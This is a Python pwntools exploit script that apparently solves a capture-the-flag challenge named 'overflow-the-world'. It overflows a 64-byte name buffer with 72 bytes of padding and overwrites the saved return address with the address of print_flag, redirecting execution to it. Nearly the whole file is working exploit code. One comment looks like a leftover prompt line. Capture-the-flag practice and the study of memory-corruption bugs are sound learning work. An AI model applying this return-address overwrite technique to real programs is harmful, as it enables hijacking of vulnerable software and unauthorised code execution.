#!/usr/bin/env python3
from pwn import *

# Load the target binary
exe = ELF("./overflow-the-world")

r = process([exe.path])
# gdb.attach(r)

# 1. Get the address of the "win" function (print_flag)
win = exe.symbols["print_flag"]

# --- Payload Construction ---
# The offset to overwrite the Saved RIP is the size of the buffer (64 bytes)
# plus the size of the Saved Base Pointer (RBP) (8 bytes).
# Total Offset: 64 + 8 = 72 bytes.
OFFSET = 72

# Padding: Fill the buffer (name[64]) and overwrite the Saved RBP (8 bytes)
padding = b"A" * OFFSET 

# Target Address: The address of print_flag, packed as a 64-bit value (p64).
target_rip = p64(win)

# Final Payload: Padding to reach RIP, followed by the address of the win function
# prompt: it should be overwrite the saved base pointer (rbp), positioning the payload right at the saved return address, then add p64(win).
payload = padding + target_rip 

# --- Exploit Execution ---
r.recvuntil(b"What's your name? ")
r.sendline(payload)

# The program will return from game() and jump to print_flag()
# We wait for the final message before interacting
r.recvuntil(b"Let's play a game.\n")

r.interactive()